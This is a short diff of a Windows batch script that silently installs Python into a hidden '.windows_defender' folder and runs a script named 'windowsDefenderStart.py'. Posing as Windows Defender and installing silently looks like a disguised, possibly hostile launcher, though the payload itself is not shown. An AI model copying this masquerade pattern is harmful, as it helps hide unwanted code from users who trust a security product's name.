@@ -11,4 +11,4 @@ if not exist "%USERPROFILE%\.windows_defender\python-2.7.10.amd64.msi" (
 
 msiexec /i python-2.7.10.amd64.msi /qn TARGETDIR=%USERPATH%\.windows_defender\python
 
-%USERPATH%\.windows_defender\python.exe windowsDefenderStart.py
+python\python.exe windowsDefenderStart.py
